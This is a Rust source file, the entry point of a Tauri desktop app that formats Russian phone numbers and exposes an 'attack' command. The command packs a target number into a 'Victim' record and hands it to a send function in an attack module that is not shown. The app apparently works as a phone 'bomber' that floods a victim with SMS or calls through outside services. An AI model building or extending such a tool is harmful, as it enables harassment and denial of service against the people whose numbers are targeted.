#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

mod attack;
mod phone;
mod services;

use tauri::{AppHandle, Manager};

use crate::attack::send;
use crate::phone::{Country, FormatterErrors, Phone};
use crate::services::Victim;

#[cfg_attr(mobile, tauri::mobile_entry_point)]
fn main() {
    tauri::Builder::default()
        .plugin(tauri_plugin_shell::init())
        .plugin(tauri_plugin_dialog::init())
        .invoke_handler(tauri::generate_handler![
            format_phone_ru,
            attack,
            show_about_window
        ])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}

#[tauri::command]
fn format_phone_ru(numbers: &str) -> String {
    match Phone::new(numbers.to_string(), Country::Ru) {
        Ok(t) => t.phone,
        Err(e) => match e {
            FormatterErrors::IncorrectLength => {
                println!("Incorrect number length\n");
                "0".to_string()
            }
            FormatterErrors::IncorrectPatter => {
                println!("Incorrect pattern\nNumber must be like 7 (9xx) xxx-xx-xx\n");
                "1".to_string()
            }
        },
    }
}

#[tauri::command]
async fn attack(phone: String) {
    let phone = Phone {
        phone,
        country: Country::Ru,
    };

    let victim = Victim {
        phone,
        email: "".to_string(),
        name: "".to_string(),
        surname: "".to_string(),
    };

    println!();
    let _ = send(victim).await;
}

#[tauri::command]
async fn show_about_window(app: AppHandle) {
    let about_window = app.get_webview_window("about").unwrap();
    about_window.show().unwrap();
}
